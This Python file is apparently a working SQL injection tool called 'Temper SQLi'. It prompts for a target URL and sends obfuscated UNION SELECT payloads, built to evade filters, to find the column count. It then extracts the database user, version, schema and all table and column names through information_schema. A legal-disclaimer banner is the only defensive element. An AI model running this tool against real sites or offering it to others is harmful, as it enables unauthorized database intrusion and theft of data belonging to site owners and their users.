import requests
import re
import time
import datetime
from bs4 import BeautifulSoup
def banner():
    start_time = datetime.datetime.now().strftime("Start Exploit Date Time : %H:%M:%S - /%d/%m/%Y")
    print('''                         
 _                                    _ _ 
| |_ ___ _____ ___ ___ ___    ___ ___| |_| (1.2.15)
|  _| -_|     | . | -_|  _|  |_ -| . | | |
|_| |___|_|_|_|  _|___|_|    |___|_  |_|_| (Pham Chien)
              |_|                  |_|   
                                 (ghostmanews.blogspot.com)

[-] Warning :
[+] Using Temper SQLi without proper authorization and legal permission is strictly prohibited. Unauthorized use of this tool can lead to severe consequences, including legal actions and criminal charges. Always ensure that you have obtained proper consent and authorization from the target system's owner before conducting any security testing.
    
    {}
'''.format(start_time))

def clear_session():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

clear_session()
banner()

# URL của trang web có thể chứa lỗ hổng SQLi
url = input("URL TARGET : ")
print("")
time.sleep(1)
# Payload chứa lệnh SQLi sử dụng UNION để tìm kiếm dữ liệu
payloads = [
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-',    
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-', 
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-', 
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-',  
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,32,32,33--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-',
]

print("[+] Testing 'UNION SELECT COLUMNS'............")

def get_columns():
    num_columns = 0
    print("[+] Starting Checking IF the columns numbers.....")
    for payload in payloads:
        num_columns += 1
        results = requests.get(url + payload)
        num_check = 2
        if results.status_code == 200:
            check_vuln = requests.get(url + "%27")
            if "at line" in check_vuln.text:
                if str(num_columns) in results.text:
                    if "The used SELECT statements have a different number of columns" in results.text:
                        pass
                    else:
                        print("[+] Found : {} columns".format(num_columns))
                        time.sleep(1.5)
                        print("[+] Starting Testing get username MySQL")
                        time.sleep(0.50)
                        print("[+] Random payload...")
                        time.sleep(0.60)
                        def get_user():
                            num = int(input("Num Columns : "))
                            check_num = requests.get(url + payload)
                            if str(num) in check_num.text:
                                print("[+] Columns {} is valid Found".format(num))
                                new_payload = "user()"
                                payload_1 = re.sub(r"\b{}\b".format(num), new_payload, payload)
                                results_1 = requests.get(url + payload_1)
                                html_content = results_1.text

                                ver_load = "version()"
                                ver_payload = re.sub(r"\b{}\b".format(num), ver_load, payload)
                                results_2 = requests.get(url + ver_payload)
                                dbms_ver = results_2.text

                                get_users = r"\b\w+@"
                                mysql_usr = re.findall(get_users, html_content)

                                get_ver_1 = r"\b\w+DB\b"
                                get_ver_2 = r"\b\w+ubuntu\b"
                                get_ver_3 = r"\b\w+MySQL\b"
                                mariadb = re.findall(get_ver_1, dbms_ver)
                                ubuntu = re.findall(get_ver_2, dbms_ver)
                                mysql = re.findall(get_ver_3, dbms_ver)
                                print('')
                                print('  Blind Database ')
                                print('-------------------')
                                for usr_mysql in mysql_usr:
                                    if usr_mysql:
                                        def mysql_user():
                                            rmv = usr_mysql.replace('@', '')
                                            rmv2 = rmv.split('@')
                                            user = rmv2[-1]
                                            print('User :', user)
                                            print("Columns : ", num_columns)
                                            pl_schema = "(select group_concat(user(),' :: ',schema()))"
                                            pl = re.sub(r"\b{}\b".format(num), pl_schema, payload)
                                            results_4 = requests.get(url + pl)
                                            html_1 = results_4.text
                                            get_line = r"\b\w+class\b"
                                            all_line = re.findall(get_line, html_1)
                                            for schema in all_line:
                                                if "::" in results_4.text:
                                                    print("Schema :", schema)

                                        mysql_user()
                                    else:
                                        print("[-] Oops, get user failed ?")
                                        exit()

                                if "MariaDB" in dbms_ver:
                                    print("Version : MariaDB")
                                if "ubuntu" in dbms_ver:
                                    print("Version : ubuntu")
                                if "cll-lve" in dbms_ver:
                                    print("Version : cll-lve")
                                if "MySQL" in dbms_ver:
                                    print("Version : MySQL")
                                
                                def get_dbs():
                                    payload_dbs = "(SELECT+GROUP_CONCAT(user(),' :: ',database(),' :: ',table_name,' :: ',column_name,' :: ',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                    query_id = re.sub(r'\b{}\b'.format(num), payload_dbs, payload)
                                    results_3 = requests.get(url +query_id)
                                    html = results_3.text
                                    soup = BeautifulSoup(html, 'html.parser')
                                    blind_data = soup.find('html')
                                    print("")
                                    print("table_name | columns_name")
                                    print("--------------------------")
                                    for line in blind_data:
                                        if "::" in line.get_text():
                                            print(line.get_text())
                                    payload_dbs = "(SELECT+GROUP_CONCAT(user(),' :: ',database(),' :: ',table_name,' :: ',column_name,' :: ',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema='information_schema')"
                                    query_id = re.sub(r'\b{}\b'.format(num), payload_dbs, payload)
                                    results_3 = requests.get(url +query_id)
                                    html = results_3.text
                                    soup = BeautifulSoup(html, 'html.parser')
                                    blind_data = soup.find('html')
                                    print("")
                                    print("table_name | columns_name")
                                    print("--------------------------")
                                    for line in blind_data:
                                        if "::" in line.get_text():
                                            print(line.get_text())
                                get_dbs()

                            else:
                                print("[-] Columns {} not valid ??? ".format(num))
                           
                        get_user()
                        exit()
            else:
                print("[-] Target Not vulnerablity")
                exit()
        else:
            print("[-] Target Not Accept ?")
            exit()

get_columns()
